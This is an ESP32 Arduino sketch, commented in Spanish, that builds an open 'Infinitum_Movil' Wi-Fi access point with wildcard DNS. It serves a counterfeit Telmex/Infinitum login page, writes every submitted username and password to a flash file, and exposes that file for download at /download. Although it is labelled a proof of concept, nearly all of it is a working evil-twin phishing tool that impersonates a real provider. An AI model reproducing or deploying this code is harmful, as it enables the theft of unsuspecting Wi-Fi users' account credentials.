#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>

const char* ap_ssid = "Infinitum_Movil";  // Red muy común en México
const char* ap_password = NULL;            // Red abierta

DNSServer dnsServer;
WebServer server(80);
const char* credFile = "/logs_acceso.txt";

// Página HTML del portal (Estilo Infinitum)
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conexión Infinitum</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-top: 6px solid #005FB2; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; color: #005FB2; margin-bottom: 20px; }
        .msg { font-size: 14px; color: #555; text-align: center; margin-bottom: 25px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; margin-bottom: 5px; color: #333; font-weight: bold; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #005FB2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        button:hover { background-color: #004a8c; }
        .footer { font-size: 11px; color: #999; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">infinitum.</div>
    <div class="msg">Para continuar navegando, por favor inicia sesión con tu cuenta de Mi Telmex o correo registrado.</div>
    <form action="/login" method="POST">
        <div class="form-group">
            <label>Correo Electrónico / Usuario</label>
            <input type="text" name="username" placeholder="ejemplo@correo.com" required>
        </div>
        <div class="form-group">
            <label>Contraseña</label>
            <input type="password" name="password" placeholder="********" required>
        </div>
        <button type="submit">CONECTAR</button>
    </form>
    <div class="footer">© 2026 Teléfonos de México S.A.B. de C.V.</div>
</div>
</body>
</html>
)rawliteral";

const char* successPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset='UTF-8'><title>Conectado</title></head>
<body style="text-align:center; padding:50px; font-family: sans-serif;">
    <h2 style="color: #4CAF50;">✔️ Autenticación Exitosa</h2>
    <p>Optimizando su conexión... por favor espere.</p>
    <script>setTimeout(function(){ window.location.href='http://www.google.com'; }, 3000);</script>
</body>
</html>
)rawliteral";

void handleStaticFile() {
  server.send(200, "text/html", loginPage);
}

void setup() {
  Serial.begin(115200);
  
  if (!LittleFS.begin(true)) {
    Serial.println("Error LittleFS");
    return;
  }

  WiFi.softAP(ap_ssid, ap_password);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", loginPage);
  });

  server.on("/login", HTTP_POST, []() {
    String user = server.arg("username");
    String pass = server.arg("password");

    File file = LittleFS.open(credFile, FILE_APPEND);
    if (file) {
      file.printf("User: %s | Pass: %s\n", user.c_str(), pass.c_str());
      file.close();
    }

    Serial.printf("\n[ALERTA POC] Credenciales capturadas:\nUser: %s\nPass: %s\n", user.c_str(), pass.c_str());
    server.send(200, "text/html", successPage);
  });

  server.on("/download", HTTP_GET, []() {
    if (LittleFS.exists(credFile)) {
      File file = LittleFS.open(credFile, "r");
      server.streamFile(file, "text/plain");
      file.close();
    } else {
      server.send(404, "text/plain", "No hay datos aun.");
    }
  });

  server.onNotFound(handleStaticFile);
  server.begin();
  Serial.println("PoC Iniciado. SSID: Infinitum_Movil");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}